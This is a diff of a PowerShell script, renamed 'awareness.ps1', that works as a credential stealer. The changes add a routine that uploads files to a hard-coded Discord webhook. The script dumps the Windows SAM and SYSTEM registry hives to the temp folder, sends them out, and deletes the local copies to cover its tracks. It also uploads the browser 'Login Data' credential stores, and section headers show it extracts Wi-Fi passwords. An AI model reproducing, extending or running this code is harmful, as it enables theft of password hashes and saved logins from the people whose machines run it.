@@ -1,9 +1,9 @@
-# Supporting PowerShell Script: support_script.ps1
+# Supporting PowerShell Script: awareness.ps1
 
 # Define Discord Webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1310574631249248297/uINhiPCPEfFgH3NlZ_ioU1tAtGMwYJXfxND5yc-iSrb_a_TAR46kPq6WhTRWZY0r_qdj"
 
-# Function to send data to Discord
+# Function to send text content to Discord
 function Send-PayloadToDiscord {
     param (
         [string]$content
@@ -19,13 +19,38 @@ function Send-PayloadToDiscord {
     }
 }
 
-# Extract SAM and SYSTEM Registry Hives
+# Function to send files to Discord
+function Send-FileToDiscord {
+    param (
+        [string]$filePath,
+        [string]$fileName
+    )
+    try {
+        Add-Type -AssemblyName "System.Net.Http"
+        $client = New-Object System.Net.Http.HttpClient
+        $fileStream = [System.IO.File]::OpenRead($filePath)
+        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+        $multipartContent = New-Object System.Net.Http.MultipartFormDataContent
+        $multipartContent.Add($fileContent, "file", $fileName)
+        $client.PostAsync($webhookUrl, $multipartContent).Result
+        $fileStream.Close()
+    } catch {
+        Write-Host "Failed to send file: $_"
+    }
+}
+
+# Extract and Upload SAM and SYSTEM Registry Hives
 try {
-    reg save HKLM\SAM sam /y
-    reg save HKLM\SYSTEM system /y
-    Send-PayloadToDiscord -content "SAM and SYSTEM registry hives saved."
+    $samPath = "$env:TEMP\sam"
+    $systemPath = "$env:TEMP\system"
+    reg save HKLM\SAM $samPath /y
+    reg save HKLM\SYSTEM $systemPath /y
+    Send-FileToDiscord -filePath $samPath -fileName "SAM"
+    Send-FileToDiscord -filePath $systemPath -fileName "SYSTEM"
+    Remove-Item $samPath, $systemPath -Force
+    Send-PayloadToDiscord -content "SAM and SYSTEM registry hives saved and uploaded."
 } catch {
-    Write-Host "Error saving SAM or SYSTEM: $_"
+    Write-Host "Error handling SAM or SYSTEM: $_"
 }
 
 # Extract Wi-Fi Credentials
@@ -67,7 +92,8 @@ try {
     foreach ($browser in $browsers) {
         $loginData = "$env:LOCALAPPDATA\$browser\User Data\Default\Login Data"
         if (Test-Path $loginData) {
-            Send-PayloadToDiscord -content "Browser: $browser - Login Data file found."
+            Send-FileToDiscord -filePath $loginData -fileName "$browser_LoginData"
+            Send-PayloadToDiscord -content "Browser: $browser - Login Data file uploaded."
         }
     }
 } catch {
